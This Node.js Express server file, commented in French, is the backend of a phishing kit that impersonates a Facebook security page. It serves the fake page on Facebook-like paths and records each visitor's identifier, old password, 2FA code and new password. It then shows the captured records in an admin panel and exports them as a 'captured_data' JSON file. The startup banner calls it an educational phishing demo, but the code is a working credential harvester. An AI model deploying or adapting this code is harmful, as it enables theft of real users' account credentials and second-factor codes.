const express = require('express');
const fs = require('fs');
const path = require('path');

(function loadDotenv() {
  const files = [path.join(__dirname, '.env.local'), path.join(__dirname, '.env')];
  for (const file of files) {
    try {
      if (!fs.existsSync(file)) continue;
      const raw = fs.readFileSync(file, 'utf8');
      const lines = raw.split(/\r?\n/);
      for (const ln of lines) {
        const line = ln.trim();
        if (!line || line.startsWith('#')) continue;
        const eq = line.indexOf('=');
        if (eq < 1) continue;
        let k = line.slice(0, eq).trim();
        let v = line.slice(eq + 1).trim();
        if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) {
          v = v.slice(1, -1);
        }
        if (!(k in process.env)) process.env[k] = v;
      }
    } catch (e) {
      console.warn('[env] Impossible de lire ' + file, e && e.message);
    }
  }
})();

const { applyNoCache, confirmationHtml, twoFaHtml, renderAdmin, requireAdminAuth } = require('./api/_html');
const { addEntry, getAll, clearAll } = require('./api/_storage');

const app = express();
const PORT = parseInt(process.env.PORT, 10) || 3000;

app.disable('x-powered-by');
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

const STATIC_DIRS = [__dirname, path.join(__dirname, 'public')];

function trySendStatic(res, file) {
  for (const dir of STATIC_DIRS) {
    const full = path.join(dir, file);
    try {
      if (fs.existsSync(full)) {
        res.sendFile(full);
        return true;
      }
    } catch (e) {}
  }
  return false;
}

app.get(['/', '/security', '/security/check', '/login/identify'], (req, res) => {
  applyNoCache(res);
  if (trySendStatic(res, 'index.html')) return;
  res.status(404).send('index.html introuvable');
});

app.post('/submit', async (req, res) => {
  applyNoCache(res);
  const body = req.body || {};
  const entry = {
    timestamp: new Date().toLocaleString('fr-FR'),
    identifier: body.identifier || '',
    old_password: body.oldPassword || '',
    code_2fa: '',
    new_password: '',
    confirm_password: ''
  };
  try { await addEntry(entry); } catch (err) { console.warn('[submit] addEntry failed', err && err.message); }
  res.status(200).type('text/html; charset=utf-8').send(confirmationHtml);
});

app.post('/submit-2fa', async (req, res) => {
  applyNoCache(res);
  const body = req.body || {};
  const entry = {
    timestamp: new Date().toLocaleString('fr-FR'),
    identifier: body.identifier || '',
    old_password: body.oldPassword || '',
    code_2fa: body.code_2fa || '',
    new_password: body.newPassword || '',
    confirm_password: body.confirmPassword || ''
  };
  try { await addEntry(entry); } catch (err) { console.warn('[submit-2fa] addEntry failed', err && err.message); }
  res.status(200).type('text/html; charset=utf-8').send(confirmationHtml);
});

app.get('/admin', async (req, res) => {
  if (!requireAdminAuth(req, res)) return;
  applyNoCache(res);
  let data = [];
  try { data = await getAll(); } catch (err) { console.warn('[admin] getAll failed', err && err.message); }
  res.status(200).type('text/html; charset=utf-8').send(renderAdmin(data));
});

app.get('/admin/export', async (req, res) => {
  if (!requireAdminAuth(req, res)) return;
  applyNoCache(res);
  let data = [];
  try { data = await getAll(); } catch (err) { console.warn('[admin-export] getAll failed', err && err.message); }
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  res.setHeader('Content-Disposition', `attachment; filename="captured_data_${stamp}.json"`);
  res.status(200).type('application/json; charset=utf-8').send(JSON.stringify(data, null, 2));
});

app.get('/admin/clear', async (req, res) => {
  if (!requireAdminAuth(req, res)) return;
  applyNoCache(res);
  try { await clearAll(); } catch (err) { console.warn('[admin-clear] clearAll failed', err && err.message); }
  res.redirect(302, '/admin');
});

app.use((req, res) => {
  res.status(404).type('text/plain; charset=utf-8').send('404 NOT_FOUND');
});

if (require.main === module) {
  app.listen(PORT, () => {
    const width = 60;
    const sep = '═'.repeat(width);
    console.log('\n' + sep);
    console.log('  facebook.com/security  •  Demo éducative Phishing');
    console.log(sep);
    console.log(`  Mode        : SERVEUR EXPRESS (Node ${process.version})`);
    console.log(`  Port        : ${PORT}`);
    console.log(`  Lien local  : http://localhost:${PORT}/security`);
    console.log(`  Panel admin : http://localhost:${PORT}/admin`);
    const u = (process.env.ADMIN_USER || '').trim();
    const p = (process.env.ADMIN_PASSWORD || '').trim();
    if (u || p) {
      const masked = p ? '*'.repeat(Math.min(p.length, 12)) : '(vide)';
      console.log(`  Auth Admin  : user="${u || '(vide)'}"  mdp="${masked}"  (HTTP Basic Auth)`);
    } else {
      console.log('  ⚠ Auth Admin  : AUCUN (accès public - déconseillé)');
    }
    console.log(sep + '\n');
  });
}

module.exports = app;
